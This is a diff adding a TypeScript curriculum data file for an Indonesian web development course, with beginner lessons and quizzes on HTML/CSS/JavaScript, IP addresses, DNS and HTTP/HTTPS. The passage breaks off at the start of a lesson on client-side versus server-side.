@@ -1,0 +1,9528 @@
+export interface LessonQuiz {
+  id: string;
+  question: string;
+  options: string[];
+  correctIndex: number;
+  explanation: string;
+}
+
+export interface LessonExercise {
+  id: string;
+  prompt: string;
+  starterCode: string;
+  solutionCode: string;
+  expectedOutput: string;
+}
+
+export interface LessonItem {
+  id: string;
+  stageId: string;
+  slug: string;
+  title: string;
+  titleEn?: string;
+  level: "BEGINNER" | "INTERMEDIATE" | "ADVANCED";
+  estimatedMinutes: number;
+  description: string;
+  descriptionEn?: string;
+  contentMd: string;
+  contentMdEn?: string;
+  prerequisites: string[];
+  prerequisiteReason?: string;
+  learningObjectives?: string[];
+  whyMatters?: string;
+  careerContext?: string;
+  commonMistakes?: string[];
+  keyTerms?: { term: string; definition: string }[];
+  quizzes: LessonQuiz[];
+  exercise?: LessonExercise;
+  miniProject?: {
+    title: string;
+    description: string;
+    deliverables: string[];
+  };
+}
+
+export interface StageItem {
+  id: string;
+  orderIndex: number;
+  titleId: string;
+  titleEn: string;
+  description: string;
+  descriptionEn?: string;
+  category: "Fundamentals" | "Frontend" | "Backend" | "Fullstack & DevOps" | "Portfolio";
+  lessons: LessonItem[];
+}
+
+export const CURRICULUM_STAGES: StageItem[] = [
+  {
+    "id": "stage-1",
+    "orderIndex": 1,
+    "titleId": "Web Development Fundamentals",
+    "titleEn": "Web Development Fundamentals",
+    "category": "Fundamentals",
+    "description": "Memahami bagaimana internet, browser, server, alamat IP, DNS, dan protokol HTTP bekerja menghubungkan pengguna dengan website.",
+    "descriptionEn": "Understand how the internet, browsers, servers, IP addresses, DNS, and HTTP connect users with websites.",
+    "lessons": [
+      {
+        "id": "lesson-1-1",
+        "stageId": "stage-1",
+        "slug": "pengenalan-web-dan-sejarah-singkat",
+        "title": "Pengenalan Web & Tiga Pilar Utama",
+        "titleEn": "Introduction to the Web & Three Core Pillars",
+        "level": "BEGINNER",
+        "estimatedMinutes": 10,
+        "description": "Mengenal World Wide Web dan peran masing-masing teknologi: HTML (struktur), CSS (tampilan), dan JavaScript (interaksi).",
+        "prerequisites": [],
+        "learningObjectives": [
+          "Menjelaskan perbedaan fungsi antara HTML, CSS, dan JavaScript.",
+          "Mengidentifikasi peran masing-masing teknologi dalam pembentukan halaman web.",
+          "Menganalisis dampak ketiadaan salah satu teknologi pada pengalaman pengguna."
+        ],
+        "whyMatters": "Sebelum menulis kode, Anda perlu mengetahui batas tanggung jawab setiap teknologi agar tidak salah dalam memilih alat saat membangun halaman web.",
+        "careerContext": "Developer profesional memisahkan struktur, tampilan, dan perilaku kode (Separation of Concerns) agar proyek mudah dirawat dan dikembangkan dalam tim.",
+        "commonMistakes": [
+          "Mencoba mengatur warna dan tata letak langsung di file HTML tanpa memanfaatkan CSS.",
+          "Menggunakan JavaScript untuk membuat layout visual yang sebenarnya bisa diselesaikan dengan CSS murni."
+        ],
+        "keyTerms": [
+          {
+            "term": "World Wide Web (WWW)",
+            "definition": "Sistem dokumen dan aplikasi yang saling terhubung melalui protokol internet."
+          },
+          {
+            "term": "HTML",
+            "definition": "HyperText Markup Language: bahasa markah untuk menyusun kerangka dan struktur konten web."
+          },
+          {
+            "term": "CSS",
+            "definition": "Cascading Style Sheets: bahasa penata gaya untuk mengatur estetika visual, warna, font, dan tata letak."
+          },
+          {
+            "term": "JavaScript",
+            "definition": "Bahasa pemrograman tingkat tinggi untuk memberikan interaktivitas dinamis dan logika pada halaman web."
+          }
+        ],
+        "contentMd": "# Pengenalan Web & Tiga Pilar Utama\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari konsep dasar World Wide Web serta tiga teknologi utama yang menjadi fondasi setiap website di internet: HTML, CSS, dan JavaScript.\n\n## Mengapa Konsep Ini Penting?\nSetiap halaman web yang Anda buka di browser—mulai dari portal berita hingga aplikasi kompleks—selalu dibangun di atas tiga pilar ini. Memahami pemisahan tanggung jawab (Separation of Concerns) antara struktur, estetika, dan logika adalah langkah awal terpenting bagi calon web developer.\n\n## Konsep Utama: Tiga Pilar Web\nUntuk membangun antarmuka web yang lengkap, tiga teknologi bekerja bersama secara terpadu:\n\n1. **HTML (Struktur & Konten)**: Menentukan elemen apa saja yang ada pada halaman, seperti judul, paragraf, gambar, tombol, dan formulir.\n2. **CSS (Presentasi & Tampilan)**: Mengatur bagaimana elemen HTML tersebut terlihat, termasuk warna latar belakang, tipografi, jarak (margin/padding), dan tata letak responsif.\n3. **JavaScript (Logika & Interaktivitas)**: Memberikan perilaku dinamis pada elemen, seperti validasi input formulir saat diketik, animasi interaktif, atau pengambilan data dari server tanpa memuat ulang halaman.\n\n## Analogi Sederhana: Struktur Bangunan\nUntuk mempermudah pemahaman:\n- **HTML** adalah fondasi beton, dinding bata, dan pintu ruangan (kerangka fisik bangunan).\n- **CSS** adalah cat dinding, dekorasi interior, lampu, dan penataan furnitur (estetika dan kenyamanan visual).\n- **JavaScript** adalah sistem kelistrikan otomatis, sensor pintu geser, dan lift (mekanisme interaktif yang merespons aksi penghuni).\n\n## Contoh Kode Sederhana\nBerikut adalah contoh bagaimana ketiga pilar tersebut berkolaborasi dalam satu komponen sederhana:\n\n```html\n<!-- 1. Struktur (HTML) -->\n<button id=\"btn-suka\" class=\"tombol-interaktif\">Suka (0)</button>\n\n<!-- 2. Tampilan (CSS) -->\n<style>\n  .tombol-interaktif {\n    background-color: #2563eb;\n    color: #ffffff;\n    padding: 8px 16px;\n    border-radius: 6px;\n    border: none;\n    cursor: pointer;\n  }\n</style>\n\n<!-- 3. Logika (JavaScript) -->\n<script>\n  let jumlahSuka = 0;\n  const tombol = document.getElementById('btn-suka');\n  tombol.addEventListener('click', () => {\n    jumlahSuka += 1;\n    tombol.textContent = `Suka (${jumlahSuka})`;\n  });\n</script>\n```\n\n## Penjelasan Kode\n1. Tag `<button>` pada HTML mendefinisikan tombol fisik di layar.\n2. Blok `<style>` pada CSS memberikan warna biru, teks putih, sudut membulat, dan jarak padding agar tombol terlihat menarik.\n3. Blok `<script>` pada JavaScript menangkap klik pengguna dan menambah hitungan angka suka secara realtime tanpa me-reload halaman browser.\n\n## Kesalahan Umum Pemula\n- **Mencampurkan kode styling ke dalam tag HTML**: Menggunakan atribut inline seperti `<font color=\"red\">` yang sudah usang, alih-alih menggunakan CSS eksternal.\n- **Menganggap website tidak bisa jalan tanpa JavaScript**: Website statis yang berisi teks dan gambar tetap dapat berfungsi sempurna hanya dengan HTML dan CSS. JavaScript ditambahkan saat membutuhkan interaksi dinamis.\n\n## Praktik Mandiri\n1. Buka browser Anda dan klik kanan pada halaman website mana saja, lalu pilih **Inspect / Inspect Element**.\n2. Perhatikan tab **Elements**: amati struktur tag HTML di sebelah kiri dan aturan CSS di panel sebelah kanan.\n\n## Ringkasan\n- **HTML** menyusun kerangka dan konten halaman web.\n- **CSS** memperindah tampilan visual dan mengatur tata letak.\n- **JavaScript** mengontrol perilaku dan interaktivitas data.\n- Ketiga teknologi ini bekerja secara terpisah namun saling melengkapi.",
+        "quizzes": [
+          {
+            "id": "q-1-1-1",
+            "question": "Berdasarkan prinsip pemisahan tanggung jawab (Separation of Concerns), teknologi manakah yang bertugas menentukan warna latar belakang, jenis font, dan jarak elemen?",
+            "options": [
+              "CSS (Cascading Style Sheets)",
+              "HTML (HyperText Markup Language)",
+              "JavaScript",
+              "DNS (Domain Name System)"
+            ],
+            "correctIndex": 0,
+            "explanation": "CSS bertugas mengatur estetika visual, tata letak, warna, tipografi, dan tampilan seluruh elemen halaman web."
+          },
+          {
+            "id": "q-1-1-2",
+            "question": "Dalam analogi pembangunan rumah yang dijelaskan pada materi, teknologi apakah yang bertindak sebagai pondasi beton, batu bata, dan pintu bangunan?",
+            "options": [
+              "HTML",
+              "JavaScript",
+              "CSS",
+              "HTTP"
+            ],
+            "correctIndex": 0,
+            "explanation": "HTML adalah kerangka fisik yang menentukan di mana elemen seperti teks, judul, gambar, dan tombol ditempatkan."
+          },
+          {
+            "id": "q-1-1-3",
+            "question": "Apa yang terjadi jika sebuah halaman web hanya dibuat menggunakan HTML dan CSS tanpa menyertakan kode JavaScript sama sekali?",
+            "options": [
+              "Halaman web tetap dapat tampil rapi dan kontennya terbaca, namun tidak memiliki interaktivitas dinamis seperti penghitung klik otomatis.",
+              "Halaman web akan langsung rusak dan browser menolak menampilkan teks.",
+              "Browser akan memunculkan pesan error fatal bahwa file JavaScript hilang.",
+              "Tampilan warna CSS tidak akan dapat dirender oleh browser."
+            ],
+            "correctIndex": 0,
+            "explanation": "HTML dan CSS cukup untuk menyajikan konten statis yang rapi. JavaScript hanya dibutuhkan jika ada interaktivitas logika dinamis."
+          },
+          {
+            "id": "q-1-1-4",
+            "question": "Manakah peran utama dari JavaScript pada contoh komponen tombol suka di dalam materi?",
+            "options": [
+              "Menangkap event klik pengguna dan memperbarui teks jumlah angka suka secara realtime.",
+              "Memberikan warna biru dan border membulat pada tombol.",
+              "Menyediakan elemen tombol dasar pada dokumen.",
+              "Menghubungkan komputer pengguna ke server database cloud."
+            ],
+            "correctIndex": 0,
+            "explanation": "JavaScript menangani logika interaktif: mendengarkan event klik dan mengubah konten teks tombol secara dinamis."
+          }
+        ]
+      },
+      {
+        "id": "lesson-1-2",
+        "stageId": "stage-1",
+        "slug": "cara-kerja-internet-dan-alamat-ip",
+        "title": "Cara Kerja Internet & Alamat IP",
+        "titleEn": "How the Internet Works & IP Addresses",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memahami bagaimana data dikirim melalui jaringan global dan peran Alamat IP (IPv4 vs IPv6) sebagai identitas perangkat.",
+        "prerequisites": [
+          "pengenalan-web-dan-sejarah-singkat"
+        ],
+        "learningObjectives": [
+          "Menjelaskan mekanisme pertukaran data antar komputer melalui jaringan internet.",
+          "Mendefinisikan fungsi Alamat IP (IP Address) sebagai alamat identifikasi perangkat.",
+          "Membedakan karakteristik dan format penulisan antara IPv4 dan IPv6."
+        ],
+        "whyMatters": "Mengetahui bagaimana komputer berkomunikasi melalui IP address membantu developer mendiagnosis masalah konektivitas jaringan, hosting server, dan konfigurasi domain.",
+        "careerContext": "Setiap konfigurasi server web, DNS record, dan firewall jaringan bergantung pada pemahaman alamat IP yang tepat.",
+        "commonMistakes": [
+          "Mengira bahwa internet dan web adalah hal yang persis sama (Internet adalah infrastruktur jaringan fisik global, sedangkan Web adalah layanan di atas internet).",
+          "Mengira bahwa IPv4 memiliki kuota alamat yang tidak terbatas."
+        ],
+        "keyTerms": [
+          {
+            "term": "Internet",
+            "definition": "Jaringan global komputer yang saling terhubung menggunakan protokol standar TCP/IP."
+          },
+          {
+            "term": "IP Address",
+            "definition": "Deretan angka pengidentifikasi unik yang dimiliki setiap perangkat yang terhubung ke jaringan internet."
+          },
+          {
+            "term": "IPv4",
+            "definition": "Format alamat IP 32-bit yang terdiri dari empat kelompok angka (contoh: 192.168.1.1)."
+          },
+          {
+            "term": "IPv6",
+            "definition": "Format alamat IP 128-bit yang menggunakan format heksadesimal untuk menyediakan triliunan kombinasi alamat baru."
+          }
+        ],
+        "contentMd": "# Cara Kerja Internet & Alamat IP\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari bagaimana data berpindah melintasi jaringan internet global dan mengapa setiap perangkat membutuhkan Alamat IP (Internet Protocol Address) sebagai identitas unik.\n\n## Mengapa Konsep Ini Penting?\nKetika Anda mengakses sebuah website, browser Anda tidak secara gaib menemukan halaman tersebut. Ada jalur komunikasi fisik dan logis yang harus ditempuh melalui alamat-alamat komputer di seluruh dunia.\n\n## Konsep Utama: Jaringan Komputer Global\nInternet pada dasarnya adalah jaringan kabel serat optik bawah laut, satelit, dan router yang menghubungkan miliaran komputer di seluruh dunia. Komputer yang meminta data disebut **Client** (misalnya laptop atau smartphone Anda), sedangkan komputer yang menyimpan dan menyajikan data disebut **Server**.\n\nKetika Client ingin meminta data dari Server, kedua perangkat harus memiliki alamat pengenal yang pasti. Alamat ini disebut **IP Address** (Internet Protocol Address).\n\n## Format Alamat IP: IPv4 vs IPv6\nSaat ini terdapat dua standar alamat IP yang digunakan di dunia:\n\n### 1. IPv4 (Internet Protocol version 4)\n- Menggunakan format **32-bit**.\n- Terdiri dari 4 blok angka desimal (0-255) yang dipisahkan oleh titik.\n- Contoh: `192.168.1.1` atau `172.217.16.206`.\n- Kapasitas total: sekitar **4,3 miliar alamat unik**. Karena jumlah perangkat pintar di dunia terus bertambah, kuota IPv4 telah hampir habis.\n\n### 2. IPv6 (Internet Protocol version 6)\n- Menggunakan format **128-bit**.\n- Ditulis dalam 8 kelompok bilangan heksadesimal yang dipisahkan oleh tanda titik dua (`:`).\n- Contoh: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`.\n- Kapasitas total: **$3.4 \\times 10^{38}$ alamat**, cukup untuk memberikan alamat IP unik pada setiap butir pasir di bumi untuk masa depan.\n\n## Bagaimana Paket Data Dikirimkan?\nKetika Anda memuat halaman web:\n1. File HTML, gambar, dan data dipecah menjadi bagian-bagian kecil yang disebut **Paket Data (Packets)**.\n2. Setiap paket data ditempeli label: **IP Asal (Client)** dan **IP Tujuan (Server)**.\n3. Router di sepanjang rute jaringan meneruskan paket-paket tersebut melalui jalur tercepat.\n4. Komputer penerima menyusun kembali paket-paket data tersebut menjadi dokumen utuh yang ditampilkan di browser.\n\n## Kesalahan Umum Pemula\n- **Menyamakan Alamat IP Publik dengan Alamat IP Lokal**: IP seperti `192.168.1.1` adalah IP private jaringan rumah/kantor lokal, sedangkan IP publik diberikan oleh ISP (*Internet Service Provider*) untuk berkomunikasi dengan internet global.\n\n## Praktik Mandiri\n1. Buka terminal atau Command Prompt di komputer Anda.\n2. Ketik perintah: `ping google.com` lalu tekan Enter.\n3. Amati deretan angka IP address server yang merespons permintaan Anda.\n\n## Ringkasan\n- Internet adalah jaringan fisik global yang menghubungkan Client dan Server.\n- **IP Address** adalah alamat unik yang digunakan perangkat untuk saling mengirim paket data.\n- **IPv4** menggunakan format 32-bit (angka dipisahkan titik), sedangkan **IPv6** menggunakan format 128-bit heksadesimal untuk kapasitas masa depan.",
+        "quizzes": [
+          {
+            "id": "q-1-2-1",
+            "question": "Apa fungsi utama dari Alamat IP (Internet Protocol Address) dalam komunikasi internet?",
+            "options": [
+              "Sebagai pengidentifikasi unik numerik untuk setiap perangkat agar data dapat dirutekan ke tujuan yang tepat.",
+              "Untuk mengenkripsi kode sumber HTML agar tidak bisa diintip pengguna.",
+              "Sebagai bahasa pemrograman untuk mendesain antarmuka visual website.",
+              "Untuk mempercepat koneksi Wi-Fi secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Alamat IP bertindak sebagai identitas lokasi logis bagi setiap perangkat di jaringan internet agar paket data tidak salah alamat."
+          },
+          {
+            "id": "q-1-2-2",
+            "question": "Manakah di bawah ini yang merupakan format penulisan IPv4 yang valid?",
+            "options": [
+              "192.168.1.1",
+              "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
+              "https://belajarinaja.com",
+              "192.168.999.999"
+            ],
+            "correctIndex": 0,
+            "explanation": "IPv4 terdiri dari empat kelompok angka desimal antara 0 hingga 255 yang dipisahkan oleh tanda titik (contoh: 192.168.1.1)."
+          },
+          {
+            "id": "q-1-2-3",
+            "question": "Mengapa standar IPv6 (128-bit) diciptakan untuk melengkapi dan menggantikan IPv4 (32-bit)?",
+            "options": [
+              "Karena kuota total alamat IPv4 (sekitar 4,3 miliar) hampir habis akibat ledakan jumlah perangkat internet di dunia.",
+              "Karena IPv4 tidak mendukung transmisi data video dan gambar.",
+              "Karena IPv4 hanya bisa digunakan pada komputer bersistem operasi Linux.",
+              "Karena IPv4 tidak kompatibel dengan protokol Wi-Fi modern."
+            ],
+            "correctIndex": 0,
+            "explanation": "Keterbatasan kuota IPv4 (4,3 miliar alamat) diatasi oleh IPv6 yang menyediakan kuadriliun kombinasi alamat baru."
+          }
+        ]
+      },
+      {
+        "id": "lesson-1-3",
+        "stageId": "stage-1",
+        "slug": "peran-dns-sebagai-buku-telepon-internet",
+        "title": "Peran DNS: Buku Telepon Internet",
+        "titleEn": "The Role of DNS: The Phonebook of the Internet",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memahami bagaimana Domain Name System (DNS) menerjemahkan nama domain yang mudah diingat manusia menjadi alamat IP server.",
+        "prerequisites": [
+          "cara-kerja-internet-dan-alamat-ip"
+        ],
+        "learningObjectives": [
+          "Menjelaskan definisi dan fungsi utama DNS (Domain Name System).",
+          "Memahami alur langkah resolusi DNS saat pengguna mengetikkan nama domain di browser.",
+          "Mengenal peran DNS Cache lokal dalam mempercepat akses website."
+        ],
+        "whyMatters": "Mengelola domain website, menghubungkan domain kustom ke hosting (seperti Vercel), dan memecahkan masalah domain error membutuhkan pemahaman cara kerja DNS.",
+        "careerContext": "Developer rutin mengonfigurasi DNS Record (A Record, CNAME, TXT) saat melakukan rilis proyek ke server produksi.",
+        "commonMistakes": [
+          "Mengira bahwa nama domain (misal: google.com) adalah alamat fisik server tempat file disimpan.",
+          "Tidak sabar menunggu propagasi DNS yang membutuhkan waktu beberapa menit hingga jam setelah perubahan record."
+        ],
+        "keyTerms": [
+          {
+            "term": "DNS (Domain Name System)",
+            "definition": "Sistem basis data terdistribusi yang memetakan nama domain ke alamat IP numerik."
+          },
+          {
+            "term": "Domain Name",
+            "definition": "Nama pengenal website yang mudah dibaca manusia (contoh: belajarinaja.com)."
+          },
+          {
+            "term": "DNS Resolver",
+            "definition": "Server perantara (biasanya dari ISP atau penyedia seperti Cloudflare/Google) yang bertugas mencari alamat IP dari domain."
+          },
+          {
+            "term": "DNS Cache",
+            "definition": "Penyimpanan sementara hasil pencarian DNS di komputer lokal untuk mempercepat akses berikutnya."
+          }
+        ],
+        "contentMd": "# Peran DNS: Buku Telepon Internet\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari bagaimana Domain Name System (DNS) bekerja sebagai sistem penerjemah yang mengubah nama domain yang mudah diingat manusia menjadi alamat IP numerik komputer server.\n\n## Mengapa Konsep Ini Penting?\nManusia lebih mudah mengingat kata seperti `belajarinaja.com` daripada deretan angka seperti `172.67.182.19`. DNS diciptakan agar pengguna tidak perlu menghafal miliaran kombinasi angka IP untuk membuka website favorit mereka.\n\n## Konsep Utama: DNS sebagai Buku Telepon\nDalam kehidupan sehari-hari, Anda menyimpan kontak teman Anda dengan nama \"Budi\" di ponsel Anda, bukan menghafal 12 digit nomor teleponnya. Saat Anda ingin menelepon Budi, ponsel Anda secara otomatis mencari nomor telepon yang terikat dengan nama tersebut.\n\nDNS bekerja dengan cara yang persis sama untuk internet:\n- **Nama Kontak**: Nama Domain (`belajarinaja.com`)\n- **Nomor Telepon**: Alamat IP Server (`172.67.182.19`)\n\n## Alur Langkah Resolusi DNS (DNS Lookup)\nKetika Anda mengetik nama domain di bilah alamat browser dan menekan Enter, alur berikut terjadi di balik layar dalam hitungan milidetik:\n\n1. **Pemeriksaan Cache Lokal**: Browser dan Sistem Operasi (OS) memeriksa apakah alamat IP domain tersebut sudah pernah disimpan baru-baru ini di memori lokal.\n2. **Menghubungi DNS Resolver**: Jika belum ada di cache, komputer meminta bantuan ke server DNS Resolver (disediakan ISP atau DNS publik seperti `1.1.1.1` atau `8.8.8.8`).\n3. **Query Hirarki DNS**: DNS Resolver bertanya ke Root DNS Server $\\rightarrow$ TLD Server (`.com`, `.id`) $\\rightarrow$ Authoritative Name Server milik domain tersebut.\n4. **Menerima Alamat IP**: Authoritative Name Server memberikan alamat IP server tujuan yang sebenarnya kepada Resolver.\n5. **Koneksi Terbentuk**: Browser menerima alamat IP tersebut, menyimpannya di cache lokal, lalu mulai menghubungi server untuk meminta konten halaman web.\n\n## Kesalahan Umum Pemula\n- **Mengira perubahan DNS langsung aktif seketika di seluruh dunia**: Perubahan konfigurasi domain (DNS Record) membutuhkan waktu propagasi (*DNS Propagation*) agar data cache di berbagai server resolver seluruh dunia diperbarui.\n\n## Praktik Mandiri\n1. Buka terminal atau Command Prompt.\n2. Ketik perintah: `nslookup belajarinaja.com` (atau nama domain lain).\n3. Perhatikan hasil output yang menampilkan alamat IP server yang dituju.\n\n## Ringkasan\n- **DNS** adalah sistem penerjemah antara nama domain yang ramah manusia dan alamat IP numerik komputer.\n- Komputer memeriksa **DNS Cache lokal** terlebih dahulu sebelum melakukan pencarian ke jaringan luar untuk menghemat waktu.\n- Tanpa DNS, pengguna harus menghafal alamat IP setiap server web yang ingin dikunjungi.",
+        "quizzes": [
+          {
+            "id": "q-1-3-1",
+            "question": "Mengapa sistem DNS dianalogikan sebagai 'buku telepon' internet?",
+            "options": [
+              "Karena DNS menerjemahkan nama domain yang mudah dibaca manusia (seperti belajarinaja.com) menjadi alamat IP server komputer.",
+              "Karena DNS menyimpan kontak nomor WhatsApp tim pengembang website.",
+              "Karena DNS mempercepat kecepatan download file video di browser.",
+              "Karena DNS berfungsi memblokir malware di komputer pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "DNS memetakan nama domain teks ke alamat IP angka server tujuan, persis seperti buku telepon memetakan nama orang ke nomor telepon."
+          },
+          {
+            "id": "q-1-3-2",
+            "question": "Komponen apakah yang pertama kali diperiksa oleh komputer untuk mencari alamat IP sebelum mengirim permintaan ke server DNS Resolver luar?",
+            "options": [
+              "DNS Cache lokal pada browser dan Sistem Operasi komputer Anda.",
+              "Root Server DNS di benua Amerika.",
+              "Kabel bawah laut penyedia internet.",
+              "Database server aplikasi tujuan."
+            ],
+            "correctIndex": 0,
+            "explanation": "Komputer selalu memeriksa DNS Cache lokal terlebih dahulu guna mempercepat respon tanpa perlu mengirim query jaringan jarak jauh jika sudah ada riwayat sebelumnya."
+          },
+          {
+            "id": "q-1-3-3",
+            "question": "Apa dampak jika terjadi kesalahan penulisan alamat IP pada konfigurasi DNS Record sebuah domain?",
+            "options": [
+              "Browser pengguna tidak dapat menemukan server tujuan dan memunculkan pesan error gagal menyelesaikan domain (DNS resolve error).",
+              "File kode sumber JavaScript di server akan otomatis terhapus.",
+              "Komputer pengguna akan mengalami restart mendadak.",
+              "Sertifikat keamanan komputer klien akan hangus."
+            ],
+            "correctIndex": 0,
+            "explanation": "Kesalahan pemetaan DNS record membuat jaringan gagal merutekan koneksi ke server hosting yang tepat."
+          }
+        ]
+      },
+      {
+        "id": "lesson-1-4",
+        "stageId": "stage-1",
+        "slug": "protokol-http-dan-https",
+        "title": "Protokol HTTP/HTTPS & Request-Response",
+        "titleEn": "HTTP/HTTPS Protocols & Request-Response",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memahami bagaimana browser dan server berkomunikasi menggunakan protokol HTTP/HTTPS dan siklus Request-Response.",
+        "prerequisites": [
+          "peran-dns-sebagai-buku-telepon-internet"
+        ],
+        "learningObjectives": [
+          "Menjelaskan siklus Request dan Response dalam protokol HTTP.",
+          "Mendefinisikan perbedaan mendasar antara HTTP dan HTTPS dari aspek enkripsi data.",
+          "Mengenal struktur umum HTTP Status Codes (200 OK, 404 Not Found, 500 Error)."
+        ],
+        "whyMatters": "Setiap komunikasi aplikasi web modern—mulai dari memuat halaman hingga memanggil REST API—menggunakan protokol HTTP/HTTPS.",
+        "careerContext": "Web developer sehari-hari berurusan dengan HTTP Methods (GET, POST), Headers, dan Status Codes saat menghubungkan frontend dengan backend.",
+        "commonMistakes": [
+          "Mengira data yang dikirim melalui HTTP polos aman dari penyadapan pada jaringan Wi-Fi publik.",
+          "Mengabaikan status code HTTP saat menangani error respons dari server."
+        ],
+        "keyTerms": [
+          {
+            "term": "HTTP",
+            "definition": "Hypertext Transfer Protocol: protokol standar komunikasi transfer data di web."
+          },
+          {
+            "term": "HTTPS",
+            "definition": "HTTP Secure: protokol HTTP yang diamankan dengan enkripsi SSL/TLS."
+          },
+          {
+            "term": "Request",
+            "definition": "Pesan permintaan data yang dikirimkan oleh Client (browser) ke Server."
+          },
+          {
+            "term": "Response",
+            "definition": "Pesan balasan dari Server kepada Client berisi data yang diminta atau status informasi."
+          },
+          {
+            "term": "Status Code",
+            "definition": "Kode 3 digit angka standar yang merepresentasikan hasil pemrosesan request oleh server."
+          }
+        ],
+        "contentMd": "# Protokol HTTP/HTTPS & Request-Response\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari bahasa standar komunikasi web: **HTTP (Hypertext Transfer Protocol)**, siklus **Request-Response**, serta mengapa enkripsi **HTTPS** wajib digunakan pada website modern.\n\n## Mengapa Konsep Ini Penting?\nSetiap kali Anda mengklik tautan, mengisi formulir login, atau membuka halaman profil, browser Anda mengirimkan pesan permintaan HTTP ke server dan menunggu jawaban. Memahami format pesan ini sangat krusial saat Anda mulai menghubungkan antarmuka frontend dengan server backend.\n\n## Konsep Utama: Siklus Request-Response\nKomunikasi di web menganut pola percakapan dua arah:\n\n1. **HTTP Request (Permintaan)**: Dikirim oleh Client (browser) ke Server. Pesan ini memuat:\n   - **Method**: Tindakan yang diinginkan (misal: `GET` untuk mengambil data, `POST` untuk mengirim data baru).\n   - **Path URL**: Alamat sumber daya yang diminta (misal: `/artikel/javascript`).\n   - **Headers**: Informasi tambahan seperti jenis browser dan format data yang didukung.\n   - **Body** (opsional): Data yang dikirimkan, seperti username dan password saat login.\n\n2. **HTTP Response (Jawaban)**: Dikirim oleh Server kembali ke Client. Pesan ini memuat:\n   - **Status Code**: Angka 3 digit penanda status (misal: `200 OK` atau `404 Not Found`).\n   - **Headers**: Informasi tipe konten (misal: `Content-Type: text/html`).\n   - **Body**: Konten aktual yang diminta (file HTML, data JSON, atau gambar).\n\n## Kelompok HTTP Status Code Standar\n- **2xx (Success)**: Contoh `200 OK` (permintaan berhasil diproses).\n- **3xx (Redirection)**: Contoh `301 Moved Permanently` (halaman dipindahkan ke URL baru).\n- **4xx (Client Error)**: Contoh `404 Not Found` (halaman tidak ditemukan) atau `401 Unauthorized` (belum login).\n- **5xx (Server Error)**: Contoh `500 Internal Server Error` (server mengalami kegagalan sistem internal).\n\n## Mengapa Harus HTTPS?\n- **HTTP Polos**: Data (termasuk password dan nomor kartu kredit) dikirimkan dalam bentuk teks terbuka (Plaintext). Jika Anda terhubung di Wi-Fi publik, peretas dapat menyadap data tersebut dengan mudah (Man-in-the-Middle Attack).\n- **HTTPS (HTTP Secure)**: Menambahkan enkripsi **SSL/TLS**. Data diacak sebelum dikirim melalui internet dan hanya dapat dibuka oleh server tujuan yang memiliki kunci dekripsi resmi.\n\n## Kesalahan Umum Pemula\n- **Mengabaikan HTTPS di lingkungan produksi**: Mengirimkan data sensitif pengguna melalui HTTP biasa merupakan pelanggaran keamanan serius dan akan ditandai sebagai \"Not Secure\" oleh browser modern.\n\n## Praktik Mandiri\n1. Buka browser Chrome dan tekan tombol **F12** untuk membuka Developer Tools.\n2. Buka tab **Network**, lalu refresh halaman web.\n3. Klik salah satu request pertama di daftar dan perhatikan **Status Code**, **Request Headers**, dan **Response Body**.\n\n## Ringkasan\n- Komunikasi web terjadi melalui siklus **HTTP Request** (dari browser) dan **HTTP Response** (dari server).\n- **Status Code 200** menandakan sukses, **404** halaman tidak ditemukan, dan **500** kesalahan server.\n- **HTTPS** mengenkripsi seluruh pertukaran data untuk melindungi privasi dan keamanan pengguna dari penyadapan.",
+        "quizzes": [
+          {
+            "id": "q-1-4-1",
+            "question": "Apa perbedaan paling mendasar antara protokol HTTP biasa dan HTTPS?",
+            "options": [
+              "HTTPS menambahkan lapisan enkripsi SSL/TLS sehingga data request dan response aman dari penyadapan pihak ketiga.",
+              "HTTP hanya dapat menampilkan teks hitam putih, sedangkan HTTPS menampilkan warna.",
+              "HTTP berjalan di komputer server cloud sedangkan HTTPS berjalan di database.",
+              "HTTPS membatasi ukuran request maksimal hanya 1 Kilobyte."
+            ],
+            "correctIndex": 0,
+            "explanation": "HTTPS (Hypertext Transfer Protocol Secure) mengenkripsi seluruh payload komunikasi jaringan menggunakan protokol SSL/TLS."
+          },
+          {
+            "id": "q-1-4-2",
+            "question": "Dalam siklus HTTP Request-Response, pihak manakah yang bertindak sebagai pemula (initiator) pengiriman request?",
+            "options": [
+              "Browser klien (Client / User-Agent).",
+              "Database server.",
+              "Mesin pendingin server cloud.",
+              "DNS Root Server."
+            ],
+            "correctIndex": 0,
+            "explanation": "Klien (seperti browser web atau aplikasi seluler) yang memulai siklus dengan mengirimkan HTTP Request ke server tujuan."
+          },
+          {
+            "id": "q-1-4-3",
+            "question": "Ketika browser menerima HTTP Status Code '200 OK', apa artinya bagi permintaan yang dikirimkan?",
+            "options": [
+              "Permintaan berhasil diproses oleh server dan konten dokumen yang diminta berhasil dikirimkan.",
+              "Halaman yang diminta tidak ditemukan pada direktori server.",
+              "Server mengalami kesalahan komputasi internal.",
+              "Pengguna ditolak aksesnya karena belum melakukan login."
+            ],
+            "correctIndex": 0,
+            "explanation": "Status code 200 adalah standar HTTP yang menandakan keberhasilan penuh dari pemrosesan permintaan klien."
+          },
+          {
+            "id": "q-1-4-4",
+            "question": "Kelompok status code HTTP berawalan angka 4xx (seperti 404 Not Found) menunjukkan jenis kendala apa?",
+            "options": [
+              "Kesalahan yang bersumber dari sisi Client (seperti salah mengetik URL atau tidak memiliki izin akses).",
+              "Permintaan berhasil disimpan ke database.",
+              "Kegagalan fisik pada pusat data server.",
+              "Koneksi internet pengguna terputus."
+            ],
+            "correctIndex": 0,
+            "explanation": "Status code 4xx mewakili Client Error, seperti halaman yang tidak ada (404) atau request yang tidak sah (401/403)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-1-5",
+        "stageId": "stage-1",
+        "slug": "perbedaan-client-side-vs-server-side",
+        "title": "Client-Side (Frontend) vs Server-Side (Backend)",
+        "titleEn": "Client-Side vs Server-Side",
